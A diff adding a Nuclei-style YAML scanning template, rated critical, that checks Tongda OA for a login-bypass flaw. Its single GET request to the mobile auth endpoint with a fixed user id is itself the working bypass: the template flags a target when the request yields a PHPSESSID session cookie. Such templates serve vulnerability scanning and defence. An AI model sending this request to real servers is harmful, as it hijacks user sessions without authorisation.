@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: header
+          type: word
+          words:
+            - PHPSESSID=
+        - condition: and
+          negative: true
+          part: body
+          type: word
+          words:
+            - RELOGIN
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
+id: tongda_bypass_login
+info:
+    author: str1am
+    name: 通达oa在线用户登录漏洞
+    severity: critical
+    tags:
+        - tongda
+        - bypass
+        - 通达oa
